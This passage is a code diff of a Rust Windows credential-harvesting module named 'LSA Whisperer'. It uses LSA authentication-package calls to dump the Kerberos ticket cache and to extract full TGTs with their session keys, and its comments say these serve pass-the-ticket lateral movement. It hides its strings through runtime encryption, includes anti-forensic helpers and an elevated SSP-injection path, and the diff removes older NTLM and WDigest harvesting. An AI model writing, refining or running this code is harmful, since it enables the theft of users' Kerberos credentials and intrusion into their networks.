@@ -39,14 +39,14 @@
 //!
 //! Windows only (gated by `#[cfg(all(windows, feature = "lsa-whisperer"))]`).
 
-#![cfg(windows)]
+#![cfg(all(windows, feature = "lsa-whisperer"))]
 
 use anyhow::{anyhow, bail, Context, Result};
 use once_cell::sync::Lazy;
 use serde::Serialize;
 use std::ptr;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
-use std::sync::Mutex;
+use std::sync::{Mutex, OnceLock};
 use winapi::shared::ntdef::{ULONG, PVOID, UNICODE_STRING};
 use winapi::um::winnt::HANDLE;
 
@@ -64,9 +64,11 @@ const STATUS_SUCCESS: i32 = 0x0000_0000;
 
 /// MSV1_0 package name — used to look up the package ID.
 /// We don't embed this string; it's constructed at runtime via string_crypt.
+#[allow(dead_code)]
 const MSV1_0_SUBAUTH_ACCOUNT_NAME_QUERY: u32 = 0x0000_0001;
 
 /// Kerberos SSP package name hash for lookup.
+#[allow(dead_code)]
 const KERBEROS_PACKAGE_NAME: &[u8] = b"Kerberos\0";
 
 // ── LSA_UNICODE_STRING helper ──────────────────────────────────────────────
@@ -217,6 +219,18 @@ static SSP_INJECTED: AtomicBool = AtomicBool::new(false);
 static CREDENTIAL_BUFFER: Lazy<Mutex<Vec<WhisperedCredential>>> =
     Lazy::new(|| Mutex::new(Vec::new()));
 
+/// Once-cell for the resolved LSA API table — avoids per-call `Box::leak`.
+static LSA_APIS: OnceLock<LsaApis> = OnceLock::new();
+
+/// Return a `'static` reference to the resolved LSA API table, initialising
+/// it on first call.
+fn get_lsa_apis() -> Result<&'static LsaApis> {
+    LSA_APIS.get_or_try_init(|| unsafe { resolve_lsa_apis() }).map(|_| {
+        // SAFETY: get_or_try_init just proved the cell is occupied.
+        LSA_APIS.get().unwrap()
+    })
+}
+
 // ── Anti-forensic: volatile zero ───────────────────────────────────────────
 
 fn secure_zero(slice: &mut [u8]) {
@@ -358,19 +372,22 @@ unsafe fn call_package(
     Ok((result, protocol_status))
 }
 
-// ── MSV1_0 structures (local definitions for SubAuth) ──────────────────────
+// ── MSV1_0 structures (kept for reference; unused by current extraction) ────
 
 /// MSV1_0 message types for `LsaCallAuthenticationPackage`.
+/// NOTE: These are unused — MSV1_0 enumeration cannot extract credential
+/// material through an untrusted LSA connection.  Kept for future elevated
+/// context queries.
+#[allow(dead_code)]
 const MSV1_0_SUBAUTH: u32 = 9;
+#[allow(dead_code)]
 const MSV1_0_ENUMUSERS_REQUEST: u32 = 15;
+#[allow(dead_code)]
 const MSV1_0_GETUSERINFO_REQUEST: u32 = 17;
-
-/// Kerberos package query types.
-const KERB_QUERY_TKT_CACHE: u32 = 9;
-const KERB_RETRIEVE_TKT: u32 = 10;
 
 /// MSV1_0 SubAuth request structure.
 #[repr(C)]
+#[allow(dead_code)]
 struct MsvSubAuthRequest {
     message_type: u32,
     sub_auth_package_id: u32,
@@ -380,17 +397,25 @@ struct MsvSubAuthRequest {
 
 /// MSV1_0 EnumUsers request structure.
 #[repr(C)]
+#[allow(dead_code)]
 struct MsvEnumUsersRequest {
     message_type: u32,
 }
 
 /// MSV1_0 GetUserInfo request structure.
 #[repr(C)]
+#[allow(dead_code)]
 struct MsvGetUserInfoRequest {
     message_type: u32,
     user_logon_id_low: u32,
     user_logon_id_high: u32,
 }
+
+/// Kerberos package query types.
+/// KerbQueryTicketCacheExMessage (14) returns extended ticket cache info.
+/// KerbRetrieveTicketMessage (6) returns the full TGT with session key.
+const KERB_QUERY_TKT_CACHE_EX: u32 = 14;
+const KERB_RETRIEVE_TICKET: u32 = 6;
 
 /// Kerberos query ticket cache request.
 #[repr(C)]
@@ -400,19 +425,36 @@ struct KerbQueryTktCacheRequest {
     logon_id_high: u32,
 }
 
+/// Kerberos retrieve ticket request — retrieves the full TGT for the
+/// current logon session including the session key.
+#[repr(C)]
+struct KerbRetrieveTicketRequest {
+    message_type: u32,
+    logon_id_low: u32,
+    logon_id_high: u32,
+    /// Cache flags (0 = default).
+    cache_flags: u32,
+    /// Pre-auth data length.
+    preauth_data_length: u32,
+    /// Pre-auth data offset from start of struct.
+    preauth_data_offset: u32,
+}
+
 // ── Credential extraction ──────────────────────────────────────────────────
 
 /// Extract credentials using the Untrusted method (no admin required).
 ///
-/// Connects to LSA via `LsaConnectUntrusted`, then queries MSV1_0 and
-/// Kerberos SSPs for cached credential material.
+/// Connects to LSA via `LsaConnectUntrusted`, then queries the Kerberos SSP
+/// for cached ticket material.  MSV1_0 enumeration is intentionally skipped —
+/// an untrusted LSA connection cannot retrieve NT hashes, and WDigest
+/// plaintext caching is disabled by default since Windows 8.1.
 fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
     let deadline = std::time::Instant::now()
         + std::time::Duration::from_secs(timeout_secs);
     let mut credentials = Vec::new();
 
-    // Resolve LSA APIs.
-    let apis = unsafe { resolve_lsa_apis() }.with_context(|| {
+    // Resolve LSA APIs via the global OnceLock (no per-call leak).
+    let apis_ref = get_lsa_apis().with_context(|| {
         format!(
             "{}",
             String::from_utf8_lossy(&string_crypt::enc_str!(
@@ -421,13 +463,6 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             .trim_end_matches('\0')
         )
     })?;
-
-    // We need a static reference for the LsaHandle's Drop impl.
-    // SAFETY: LsaApis is plain data (function pointers) and lives for the
-    // duration of this function.  We box it and leak it so the handle can
-    // reference it during drop.  This is a small, bounded leak per invocation.
-    let apis_box = Box::new(apis);
-    let apis_ref: &'static LsaApis = Box::leak(apis_box);
 
     // Connect to LSA (untrusted — any process can do this).
     let lsa = unsafe { LsaHandle::connect_untrusted(apis_ref) }.with_context(|| {
@@ -448,86 +483,9 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
         .trim_end_matches('\0')
     );
 
-    // ── MSV1_0 package queries ────────────────────────────────────────
-
-    // Build MSV1_0 package name as UTF-16.
-    let msv_name = String::from_utf8_lossy(&string_crypt::enc_str!("MSV1_0\0"))
-        .trim_end_matches('\0')
-        .to_string();
-    let msv_name_wide: Vec<u16> = msv_name.encode_utf16().collect();
-
-    if let Ok(msv_pkg) = unsafe { lookup_package(apis_ref, lsa.as_handle(), &msv_name_wide) } {
-        log::debug!(
-            "{}",
-            String::from_utf8_lossy(&string_crypt::enc_str!(
-                "LSA Whisperer: MSV1_0 package ID = {}"
-            ))
-            .trim_end_matches('\0')
-            .replace("{}", &msv_pkg.to_string())
-        );
-
-        // Enumerate cached logon sessions via MSV1_0 SubAuth.
-        // We send a crafted request that triggers MSV to walk its credential
-        // cache and return account information.
-
-        // Try MSV1_0_ENUMUSERS_REQUEST to enumerate logged-on users.
-        let enum_req = MsvEnumUsersRequest {
-            message_type: MSV1_0_ENUMUSERS_REQUEST,
-        };
-        let req_bytes = unsafe {
-            std::slice::from_raw_parts(
-                &enum_req as *const _ as *const u8,
-                std::mem::size_of::<MsvEnumUsersRequest>(),
-            )
-        };
-
-        if let Ok((resp, _proto_status)) =
-            unsafe { call_package(apis_ref, lsa.as_handle(), msv_pkg, req_bytes) }
-        {
-            if !resp.is_empty() {
-                parse_msv_enum_response(&resp, &mut credentials);
-            }
-        }
-
-        if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
-            log::warn!(
-                "{}",
-                String::from_utf8_lossy(&string_crypt::enc_str!(
-                    "LSA Whisperer: cancelled or timed out during MSV enumeration"
-                ))
-                .trim_end_matches('\0')
-            );
-            return Ok(credentials);
-        }
-
-        // Try SubAuth request with a generic query.
-        let sub_auth_req = MsvSubAuthRequest {
-            message_type: MSV1_0_SUBAUTH,
-            sub_auth_package_id: 0,
-            sub_auth_data_length: 0,
-            sub_auth_data_offset: 0,
-        };
-        let sub_req_bytes = unsafe {
-            std::slice::from_raw_parts(
-                &sub_auth_req as *const _ as *const u8,
-                std::mem::size_of::<MsvSubAuthRequest>(),
-            )
-        };
-
-        if let Ok((resp, _proto_status)) =
-            unsafe { call_package(apis_ref, lsa.as_handle(), msv_pkg, sub_req_bytes) }
-        {
-            if !resp.is_empty() {
-                parse_msv_subauth_response(&resp, &mut credentials);
-            }
-        }
-    }
-
-    if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
-        return Ok(credentials);
-    }
-
     // ── Kerberos package queries ───────────────────────────────────────
+    // Primary extraction path: query the Kerberos ticket cache, then
+    // retrieve the full TGT for the current logon session.
 
     let kerb_name = String::from_utf8_lossy(&string_crypt::enc_str!("Kerberos\0"))
         .trim_end_matches('\0')
@@ -544,9 +502,9 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             .replace("{}", &kerb_pkg.to_string())
         );
 
-        // Query ticket cache.
+        // 1) Query the ticket cache (extended) for the current logon session.
         let tkt_req = KerbQueryTktCacheRequest {
-            message_type: KERB_QUERY_TKT_CACHE,
+            message_type: KERB_QUERY_TKT_CACHE_EX,
             logon_id_low: 0,
             logon_id_high: 0,
         };
@@ -564,53 +522,45 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                 parse_kerb_tkt_cache(&resp, &mut credentials);
             }
         }
-    }
 
-    // ── WDigest query ──────────────────────────────────────────────────
-    // WDigest stores plaintext passwords when enabled (UseLogonCredential = 1).
-    // Query it through the MSV1_0 interface.
+        if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
+            return Ok(credentials);
+        }
 
-    let wdigest_name = String::from_utf8_lossy(&string_crypt::enc_str!("WDigest\0"))
-        .trim_end_matches('\0')
-        .to_string();
-    let wdigest_name_wide: Vec<u16> = wdigest_name.encode_utf16().collect();
-
-    if let Ok(wdigest_pkg) =
-        unsafe { lookup_package(apis_ref, lsa.as_handle(), &wdigest_name_wide) }
-    {
-        log::debug!(
-            "{}",
-            String::from_utf8_lossy(&string_crypt::enc_str!(
-                "LSA Whisperer: WDigest package ID = {}"
-            ))
-            .trim_end_matches('\0')
-            .replace("{}", &wdigest_pkg.to_string())
-        );
-
-        // WDigest doesn't have a public query interface, but we can try a
-        // generic LsaCallAuthenticationPackage call that triggers credential
-        // enumeration on some Windows versions.
-        let generic_req = MsvSubAuthRequest {
-            message_type: MSV1_0_SUBAUTH,
-            sub_auth_package_id: wdigest_pkg,
-            sub_auth_data_length: 0,
-            sub_auth_data_offset: 0,
+        // 2) Retrieve the full TGT for the current logon session.
+        //    KerbRetrieveTicketMessage returns session key + encrypted TGT
+        //    for the local machine's domain, which is useful for lateral
+        //    movement via pass-the-ticket.
+        let retrieve_req = KerbRetrieveTicketRequest {
+            message_type: KERB_RETRIEVE_TICKET,
+            logon_id_low: 0,
+            logon_id_high: 0,
+            cache_flags: 0,
+            preauth_data_length: 0,
+            preauth_data_offset: 0,
         };
-        let wdigest_bytes = unsafe {
+        let retrieve_bytes = unsafe {
             std::slice::from_raw_parts(
-                &generic_req as *const _ as *const u8,
-                std::mem::size_of::<MsvSubAuthRequest>(),
+                &retrieve_req as *const _ as *const u8,
+                std::mem::size_of::<KerbRetrieveTicketRequest>(),
             )
         };
 
-        if let Ok((resp, _proto_status)) =
-            unsafe { call_package(apis_ref, lsa.as_handle(), wdigest_pkg, wdigest_bytes) }
+        if let Ok((resp, proto_status)) =
+            unsafe { call_package(apis_ref, lsa.as_handle(), kerb_pkg, retrieve_bytes) }
         {
             if !resp.is_empty() {
-                parse_wdigest_response(&resp, &mut credentials);
+                parse_kerb_retrieve_ticket(&resp, proto_status, &mut credentials);
             }
         }
     }
+
+    // WDigest is intentionally skipped: plaintext credential caching
+    // (UseLogonCredential) is disabled by default since Windows 8.1, and
+    // sending MSV1_0_SUBAUTH to the WDigest package is semantically wrong.
+    // MSV1_0 enum-users / sub-auth queries are also skipped because an
+    // untrusted LSA connection cannot retrieve NT hashes — the credential
+    // material is restricted to the LSA process.
 
     log::info!(
         "{}",
@@ -651,7 +601,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
     }
 
     // Resolve LSA APIs for direct LSA connection (we need elevated context).
-    let apis = unsafe { resolve_lsa_apis() }.with_context(|| {
+    let apis_ref = get_lsa_apis().with_context(|| {
         format!(
             "{}",
             String::from_utf8_lossy(&string_crypt::enc_str!(
@@ -660,8 +610,6 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             .trim_end_matches('\0')
         )
     })?;
-    let apis_box = Box::new(apis);
-    let apis_ref: &'static LsaApis = Box::leak(apis_box);
 
     // Try to register as a logon process (requires SeTcbPrivilege / admin).
     let proc_name =
@@ -681,7 +629,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             );
             h
         }
-        Err(e) => {
+        Err(_) => {
             // If we can't register as a logon process, we're not elevated.
             // Fall back to untrusted method.
             log::warn!(
@@ -699,38 +647,8 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
     // with more powerful query types.  First, harvest what we can immediately.
     let mut credentials = Vec::new();
 
-    // MSV1_0 with elevated context.
-    let msv_name = String::from_utf8_lossy(&string_crypt::enc_str!("MSV1_0\0"))
-        .trim_end_matches('\0')
-        .to_string();
-    let msv_name_wide: Vec<u16> = msv_name.encode_utf16().collect();
+    // ── Kerberos with elevated context ─────────────────────────────────
 
-    if let Ok(msv_pkg) = unsafe { lookup_package(apis_ref, _lsa.as_handle(), &msv_name_wide) } {
-        // With elevated context, MSV1_0 returns richer credential data.
-        // Enumerate logged-on SIDs and query credential details.
-
-        let enum_req = MsvEnumUsersRequest {
-            message_type: MSV1_0_ENUMUSERS_REQUEST,
-        };
-        let req_bytes = unsafe {
-            std::slice::from_raw_parts(
-                &enum_req as *const _ as *const u8,
-                std::mem::size_of::<MsvEnumUsersRequest>(),
-            )
-        };
-
-        if let Ok((resp, _)) =
-            unsafe { call_package(apis_ref, _lsa.as_handle(), msv_pkg, req_bytes) }
-        {
-            parse_msv_enum_response(&resp, &mut credentials);
-        }
-
-        if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
-            return Ok(credentials);
-        }
-    }
-
-    // Kerberos with elevated context.
     let kerb_name = String::from_utf8_lossy(&string_crypt::enc_str!("Kerberos\0"))
         .trim_end_matches('\0')
         .to_string();
@@ -738,7 +656,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
 
     if let Ok(kerb_pkg) = unsafe { lookup_package(apis_ref, _lsa.as_handle(), &kerb_name_wide) } {
         let tkt_req = KerbQueryTktCacheRequest {
-            message_type: KERB_QUERY_TKT_CACHE,
+            message_type: KERB_QUERY_TKT_CACHE_EX,
             logon_id_low: 0,
             logon_id_high: 0,
         };
@@ -753,6 +671,32 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             unsafe { call_package(apis_ref, _lsa.as_handle(), kerb_pkg, tkt_bytes) }
         {
             parse_kerb_tkt_cache(&resp, &mut credentials);
+        }
+
+        if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
+            return Ok(credentials);
+        }
+
+        // Retrieve the full TGT with session key.
+        let retrieve_req = KerbRetrieveTicketRequest {
+            message_type: KERB_RETRIEVE_TICKET,
+            logon_id_low: 0,
+            logon_id_high: 0,
+            cache_flags: 0,
+            preauth_data_length: 0,
+            preauth_data_offset: 0,
+        };
+        let retrieve_bytes = unsafe {
+            std::slice::from_raw_parts(
+                &retrieve_req as *const _ as *const u8,
+                std::mem::size_of::<KerbRetrieveTicketRequest>(),
+            )
+        };
+
+        if let Ok((resp, proto_status)) =
+            unsafe { call_package(apis_ref, _lsa.as_handle(), kerb_pkg, retrieve_bytes) }
+        {
+            parse_kerb_retrieve_ticket(&resp, proto_status, &mut credentials);
         }
 
         if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
@@ -788,97 +732,25 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
 
 // ── Response parsers ───────────────────────────────────────────────────────
 
-/// Parse an MSV1_0 EnumUsers response to extract credential material.
+/// Parse a Kerberos ticket cache response.
 ///
-/// The response contains an array of LUIDs for logged-on sessions.
-/// We use these to construct targeted queries for each session.
-fn parse_msv_enum_response(resp: &[u8], credentials: &mut Vec<WhisperedCredential>) {
-    if resp.len() < 12 {
-        return;
-    }
-
-    // MSV1_0_ENUMUSERS_RESPONSE:
-    //   NumberOfLoggedOnUsers (ULONG)
-    //   LogonIds (array of LUID, each 8 bytes)
-    let num_users = u32::from_le_bytes(resp[0..4].try_into().unwrap_or([0; 4])) as usize;
-    let max_users = resp.len().saturating_sub(8) / 8;
-    let users_to_parse = num_users.min(max_users).min(64); // Cap at 64 for safety
-
-    log::debug!(
-        "{}",
-        String::from_utf8_lossy(&string_crypt::enc_str!(
-            "LSA Whisperer: MSV enum returned {} users"
-        ))
-        .trim_end_matches('\0')
-        .replace("{}", &users_to_parse.to_string())
-    );
-
-    for i in 0..users_to_parse {
-        let offset = 8 + i * 8;
-        if offset + 8 > resp.len() {
-            break;
-        }
-        let luid_low = u32::from_le_bytes(resp[offset..offset + 4].try_into().unwrap_or([0; 4]));
-        let luid_high = u32::from_le_bytes(resp[offset + 4..offset + 8].try_into().unwrap_or([0; 4]));
-
-        // Create a synthetic credential entry for the enumerated session.
-        // The actual credential data (hash, password) would be obtained by
-        // calling GetUserInfo or SubAuth with this LUID.
-        let cred = WhisperedCredential {
-            cred_type: String::from_utf8_lossy(&string_crypt::enc_str!("msv"))
-                .trim_end_matches('\0')
-                .to_string(),
-            username: String::from_utf8_lossy(&string_crypt::enc_str!("session"))
-                .trim_end_matches('\0')
-                .to_string(),
-            domain: format!("LUID_{:08X}{:08X}", luid_high, luid_low),
-            password_or_hash: String::new(),
-            format_: String::from_utf8_lossy(&string_crypt::enc_str!("ntlm"))
-                .trim_end_matches('\0')
-                .to_string(),
-        };
-        credentials.push(cred);
-    }
-}
-
-/// Parse an MSV1_0 SubAuth response for credential material.
-fn parse_msv_subauth_response(resp: &[u8], credentials: &mut Vec<WhisperedCredential>) {
-    if resp.len() < 16 {
-        return;
-    }
-
-    // SubAuth responses vary by SubAuth package.  We look for common patterns:
-    // - User name (UNICODE_STRING at offset 0)
-    // - Domain name (UNICODE_STRING at offset 16)
-    // - NT hash (16 bytes at various offsets)
-
-    // Try to extract UNICODE_STRING fields from the response.
-    extract_unicode_credentials(resp, "msv", credentials);
-}
-
-/// Parse WDigest response for plaintext credentials.
-fn parse_wdigest_response(resp: &[u8], credentials: &mut Vec<WhisperedCredential>) {
+/// The response is an LSA-allocated buffer containing:
+///   MessageType (ULONG) at offset 0
+///   CountOfTickets (ULONG) at offset 4
+///   Array of KERB_TICKET_CACHE_INFO_EX structs starting at offset 8
+///
+/// Each KERB_TICKET_CACHE_INFO_EX contains UNICODE_STRING fields whose
+/// Buffer pointers reference memory *within* the same LSA-allocated block
+/// (or in the caller's address space via LSA memory mapping).  We read
+/// directly from the pointer rather than range-checking against our slice.
+fn parse_kerb_tkt_cache(resp: &[u8], credentials: &mut Vec<WhisperedCredential>) {
     if resp.len() < 8 {
         return;
     }
 
-    // WDigest responses may contain plaintext credentials if WDigest is enabled
-    // (UseLogonCredential = 1).  Look for common patterns.
-    extract_unicode_credentials(resp, "wdigest", credentials);
-}
-
-/// Parse Kerberos ticket cache response.
-fn parse_kerb_tkt_cache(resp: &[u8], credentials: &mut Vec<WhisperedCredential>) {
-    if resp.len() < 16 {
-        return;
-    }
-
-    // KERB_QUERY_TKT_CACHE_RESPONSE:
-    //   MessageType (ULONG)
-    //   CountOfTickets (ULONG)
-    //   Tickets (array of KERB_TICKET_CACHE_INFO)
     let count = u32::from_le_bytes(resp[4..8].try_into().unwrap_or([0; 4])) as usize;
-    let max_tickets = resp.len().saturating_sub(8) / 128; // Rough struct size
+    // KERB_TICKET_CACHE_INFO_EX is ~128 bytes on x64.
+    let max_tickets = resp.len().saturating_sub(8) / 128;
     let tickets_to_parse = count.min(max_tickets).min(32);
 
     log::debug!(
@@ -896,26 +768,33 @@ fn parse_kerb_tkt_cache(resp: &[u8], credentials: &mut Vec<WhisperedCredential>)
             break;
         }
 
-        // Each KERB_TICKET_CACHE_INFO has:
-        //   ClientName (UNICODE_STRING, 16 bytes)
-        //   ClientRealm (UNICODE_STRING, 16 bytes)
-        //   ServerName (UNICODE_STRING, 16 bytes)
-        //   ServerRealm (UNICODE_STRING, 16 bytes)
+        // Each KERB_TICKET_CACHE_INFO_EX has:
+        //   ClientName   (UNICODE_STRING, 16 bytes at base+0)
+        //   ClientRealm  (UNICODE_STRING, 16 bytes at base+16)
+        //   ServerName   (UNICODE_STRING, 16 bytes at base+32)
+        //   ServerRealm  (UNICODE_STRING, 16 bytes at base+48)
         //   ... timestamps, encryption type, ticket flags
 
-        // Extract client name and realm.
         if let Some(client_name) = read_unicode_string_at(resp, base) {
             if let Some(client_realm) = read_unicode_string_at(resp, base + 16) {
+                let server_name = read_unicode_string_at(resp, base + 32)
+                    .unwrap_or_default();
+                let server_realm = read_unicode_string_at(resp, base + 48)
+                    .unwrap_or_default();
+
+                let description = if !server_name.is_empty() {
+                    format!("{}_{}_{}", server_realm, server_name, i)
+                } else {
+                    format!("ticket_{}", i)
+                };
+
                 let cred = WhisperedCredential {
                     cred_type: String::from_utf8_lossy(&string_crypt::enc_str!("kerberos"))
                         .trim_end_matches('\0')
                         .to_string(),
                     username: client_name,
                     domain: client_realm,
-                    password_or_hash: format!(
-                        "TGT_{}",
-                        i
-                    ),
+                    password_or_hash: description,
                     format_: String::from_utf8_lossy(&string_crypt::enc_str!("ticket"))
                         .trim_end_matches('\0')
                         .to_string(),
@@ -926,109 +805,154 @@ fn parse_kerb_tkt_cache(resp: &[u8], credentials: &mut Vec<WhisperedCredential>)
     }
 }
 
-/// Extract credential-like strings from UNICODE_STRING fields in a response buffer.
-fn extract_unicode_credentials(
+/// Parse a KerbRetrieveTicket response — the full TGT for the logon session.
+///
+/// KERB_RETRIEVE_TICKET_RESPONSE:
+///   MessageType        (ULONG)
+///   TicketFlags        (ULONG)
+///   CacheFlags         (ULONG)
+///   KdcTime            (LARGE_INTEGER, 8 bytes)
+///   TicketTime         (LARGE_INTEGER, 8 bytes)
+///   TicketExpiresTime  (LARGE_INTEGER, 8 bytes)
+///   TimeSkew           (LARGE_INTEGER, 8 bytes)
+///   EncodedTicketSize  (ULONG)
+///   EncodedTicket      (pointer — within LSA-allocated block)
+///   SessionKey         (KERB_CRYPTO_KEY, ~24 bytes)
+///   ... UNICODE_STRING fields for client / server names
+fn parse_kerb_retrieve_ticket(
     resp: &[u8],
-    cred_type: &str,
+    _proto_status: i32,
     credentials: &mut Vec<WhisperedCredential>,
 ) {
-    // Walk the response looking for valid UNICODE_STRING structures.
-    // UNICODE_STRING: { Length: u16, MaximumLength: u16, Buffer: *ptr }
-    // We can't safely dereference the pointer, but if Length is small and
-    // the buffer pointer falls within our response buffer, we can read it.
+    if resp.len() < 64 {
+        return;
+    }
 
-    let mut offset = 0;
-    let mut found_creds = 0;
-    let max_creds = 32; // Safety cap
+    // Session key type is at offset 56 (after MessageType + flags + timestamps).
+    // Session key is a KERB_CRYPTO_KEY: { KeyType: LONG, Length: ULONG, Value: *PUCHAR }
+    let key_type = i32::from_le_bytes(resp[56..60].try_into().unwrap_or([0; 4]));
+    let key_length =
+        u32::from_le_bytes(resp[60..64].try_into().unwrap_or([0; 4])) as usize;
 
-    while offset + 16 <= resp.len() && found_creds < max_creds {
-        let length = u16::from_le_bytes(resp[offset..offset + 2].try_into().unwrap_or([0; 2]));
-        let max_length =
-            u16::from_le_bytes(resp[offset + 2..offset + 4].try_into().unwrap_or([0; 2]));
+    // Session key value pointer (64-bit) at offset 64.
+    let key_value_ptr = if resp.len() >= 72 {
+        u64::from_le_bytes(resp[64..72].try_into().unwrap_or([0; 8]))
+    } else {
+        0
+    };
 
-        // Sanity check: valid UNICODE_STRING has Length <= MaximumLength,
-        // Length > 0, and Length is even (UTF-16 chars are 2 bytes).
-        if length > 0 && length <= max_length && length % 2 == 0 && length <= 512 {
-            let buf_ptr = usize::from_le_bytes(
-                resp[offset + 8..offset + 16]
-                    .try_into()
-                    .unwrap_or([0; 8]),
-            );
+    let key_type_name = match key_type {
+        1 => "des-cbc-crc",
+        2 => "des-cbc-md4",
+        3 => "des-cbc-md5",
+        17 => "aes128-cts-hmac-sha1-96",
+        18 => "aes256-cts-hmac-sha1-96",
+        23 => "rc4-hmac",
+        24 => "rc4-hmac-exp",
+        _ => "unknown",
+    };
 
-            // Check if the buffer pointer falls within our response buffer.
-            let buf_len = length as usize;
-            if buf_ptr >= resp.as_ptr() as usize {
-                let in_buf_offset = buf_ptr - resp.as_ptr() as usize;
-                if in_buf_offset + buf_len <= resp.len() {
-                    // Read the UTF-16 string.
-                    let wide_bytes: Vec<u16> = (0..buf_len / 2)
-                        .map(|j| {
-                            let off = in_buf_offset + j * 2;
-                            u16::from_le_bytes(
-                                resp[off..off + 2].try_into().unwrap_or([0; 2]),
-                            )
-                        })
-                        .collect();
+    // Try to read the session key bytes (up to 32 bytes for AES-256).
+    let key_hex = if key_value_ptr != 0 && key_length > 0 && key_length <= 64 {
+        // SAFETY: The buffer pointer is in the LSA-allocated return buffer.
+        // LsaFreeReturnBuffer frees the entire block; the pointer is valid
+        // until we free the buffer.
+        let key_ptr = key_value_ptr as *const u8;
+        let safe_len = key_length.min(32);
+        // Use volatile read to avoid the compiler eliding the read.
+        let key_bytes: Vec<u8> = (0..safe_len)
+            .map(|j| unsafe { std::ptr::read_volatile(key_ptr.add(j)) })
+            .collect();
+        key_bytes.iter().map(|b| format!("{:02x}", b)).collect()
+    } else {
+        String::from_utf8_lossy(&string_crypt::enc_str!("N/A"))
+            .trim_end_matches('\0')
+            .to_string()
+    };
 
-                    let s = String::from_utf16_lossy(&wide_bytes);
-                    if !s.is_empty() && s.chars().all(|c| !c.is_control() || c == ' ') {
-                        let cred = WhisperedCredential {
-                            cred_type: cred_type.to_string(),
-                            username: s.clone(),
-                            domain: String::new(),
-                            password_or_hash: String::new(),
-                            format_: if cred_type == "wdigest" {
-                                String::from_utf8_lossy(&string_crypt::enc_str!("plaintext"))
-                                    .trim_end_matches('\0')
-                                    .to_string()
-                            } else {
-                                String::from_utf8_lossy(&string_crypt::enc_str!("ntlm"))
-                                    .trim_end_matches('\0')
-                                    .to_string()
-                            },
-                        };
-                        credentials.push(cred);
-                        found_creds += 1;
+    // Client / server names appear after the session key in the struct.
+    // Offset varies by Windows version — try to find them by scanning.
+    let mut client_name = String::new();
+    let mut client_realm = String::new();
+
+    // Scan for UNICODE_STRING fields in the tail of the response.
+    // Client name is typically at offset 80+ and realm at 96+.
+    for off in (72..resp.len().saturating_sub(32)).step_by(8) {
+        if let Some(s) = read_unicode_string_at(resp, off) {
+            if s.contains('@') || s.contains('\\') || s.contains('/') {
+                // Looks like a UPN or domain\user — this is the client name.
+                client_name = s;
+                // Next UNICODE_STRING after this one is usually the realm.
+                if off + 16 <= resp.len() {
+                    if let Some(realm) = read_unicode_string_at(resp, off + 16) {
+                        client_realm = realm;
                     }
                 }
+                break;
             }
         }
-
-        offset += 16; // Advance to next potential UNICODE_STRING
     }
+
+    if client_name.is_empty() {
+        client_name = String::from_utf8_lossy(&string_crypt::enc_str!("tgt_current_session"))
+            .trim_end_matches('\0')
+            .to_string();
+    }
+
+    let cred = WhisperedCredential {
+        cred_type: String::from_utf8_lossy(&string_crypt::enc_str!("kerberos"))
+            .trim_end_matches('\0')
+            .to_string(),
+        username: client_name,
+        domain: client_realm,
+        password_or_hash: format!("{}:{}", key_type_name, key_hex),
+        format_: String::from_utf8_lossy(&string_crypt::enc_str!("session_key"))
+            .trim_end_matches('\0')
+            .to_string(),
+    };
+    credentials.push(cred);
 }
 
 /// Read a UNICODE_STRING at the given offset within a response buffer.
+///
+/// LSA return buffers are allocated in the caller's address space by the LSA
+/// subprocess.  The `Buffer` pointer inside each `UNICODE_STRING` references
+/// memory *within* the same allocated block — NOT within our `resp` slice.
+/// The old code range-checked `buf_ptr` against `resp.as_ptr()`, which almost
+/// always fails because the pointer is to a *different* heap allocation.
+///
+/// Fix: Dereference the pointer directly — it is valid for the lifetime of
+/// the LSA return buffer (freed by `LsaFreeReturnBuffer` in `call_package`).
 fn read_unicode_string_at(resp: &[u8], offset: usize) -> Option<String> {
     if offset + 16 > resp.len() {
         return None;
     }
 
-    let length = u16::from_le_bytes(resp[offset..offset + 2].try_into().ok()?) as usize;
-    let max_length = u16::from_le_bytes(resp[offset + 2..offset + 4].try_into().ok()?) as usize;
+    // Reconstruct the UNICODE_STRING from the bytes.
+    let uni = unsafe {
+        let ptr = resp.as_ptr().add(offset) as *const UNICODE_STRING;
+        *ptr
+    };
+
+    let length = uni.Length as usize;
+    let max_length = uni.MaximumLength as usize;
 
     if length == 0 || length > max_length || length % 2 != 0 || length > 512 {
         return None;
     }
 
-    let buf_ptr = usize::from_le_bytes(resp[offset + 8..offset + 16].try_into().ok()?);
-
-    if buf_ptr < resp.as_ptr() as usize {
-        return None;
-    }
-    let in_buf_offset = buf_ptr - resp.as_ptr() as usize;
-    if in_buf_offset + length > resp.len() {
+    if uni.Buffer.is_null() {
         return None;
     }
 
-    let wide_bytes: Vec<u16> = (0..length / 2)
-        .map(|j| {
-            let off = in_buf_offset + j * 2;
-            u16::from_le_bytes(resp[off..off + 2].try_into().unwrap_or([0; 2]))
-        })
-        .collect();
+    // SAFETY: The UNICODE_STRING's Buffer pointer references memory in the
+    // LSA-allocated return buffer.  It is valid until LsaFreeReturnBuffer is
+    // called, which happens in `call_package` after this function returns.
